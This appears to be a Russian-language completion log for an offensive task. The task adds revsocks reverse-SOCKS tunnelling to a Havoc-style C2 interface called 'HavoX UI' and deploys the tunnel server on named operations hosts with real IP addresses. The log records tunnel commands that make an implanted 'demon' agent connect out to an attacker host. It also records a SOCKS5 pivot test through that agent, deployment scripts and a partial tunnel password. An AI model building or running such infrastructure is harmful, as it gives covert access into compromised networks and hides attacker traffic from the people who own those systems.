# 004: HavoX UI интеграция + revsocks server на OPS (162.252.199.92)

## Что сделать
revsocks в HavoX UI как ligolo (панель с host:port → DB, команда revsocks_start без args берёт конфиг из DB). revsocks server на OPS (162.252.199.92, без CF). Idempotent DB миграция defaults.

## Границы
- revsocks без CF (прямой TCP+TLS+WS).
- OPS server на 162.252.199.92 (ligolo_ops сервер, часть OPS).
- DB миграция INSERT OR IGNORE (key есть от UI-save → не трогать).

## Статус
DONE

## Состояние
**сделано:**
- **HavoX UI** (commit `7c22499`): `RevsocksPanel.jsx` (hostport/password/tls/ws → POST /api/revsocks/config → TS_Config) + AppHeader кнопка REVSOCKS. `sse_router.py` GET/POST /revsocks/config (reuse ligolo db helpers). `soks.py`: `revsocks_start` (без args — DB config; с args — manual) + `revsocks_info`; `socks` оставлен как manual alias. static rebuilt.
- **DB миграция idempotent** (deploy `2bc7878`): `lib/havox.sh setup_havox` → `INSERT OR IGNORE INTO TS_Config` для ligolo_direct_hostport/wss + revsocks_hostport/password/tls/ws. defaults из config.env.
- **revsocks server на 162** (deploy `1b0c7ed`): `ops/modules/revsocks_direct.sh` (build server локально make server + scp на 162 + tmux session `revsocks`). `ops/deploy.sh` case `revsocks_direct` + STANDALONE remote path. `ops/config.env` REVSOCKS_PASS (OPS per-env) + REVSOCKS_HOSTPORT=162.252.199.92:443.
- **Тест PASS** (recon, демон e55ce801): `revsocks_start` (без args) → `[DB (wss://185.224.132.148:443)] -connect ... -pass ... -tls -ws` → CMD TUNNEL → agent online. SOCKS5 verify: `curl -x socks5://127.0.0.1:1080 http://185.224.132.148:8443` → 404 (трафик через agent), 3 параллельных stream → 0 yamux drop.
- **recon config**: REVSOCKS_HOSTPORT=185.224.132.148:443, REVSOCKS_PASS=3870acd6... `lib/revsocks.sh` (recon deploy product, work:2 revsocks).
- **OPS deploy после reboot**: havoc + ligolo CF + p53 + revsocks на 162 — всё поднято, work session (p53+ligolo+revsocks).

**Грабли:**
- WS режим: `-connect host:port` без схемы → Go url.Parse fail. soks.py добавляет wss:// автоматически.
- :1080 socks listener — lazy (поднимается после agent connect).
- recon демоны часто stale — для теста свежий демон через P53 `cmd demon_debug`.
- OPS revsocks_pass ≠ recon pass (per-env изоляция).

**осталось:** —
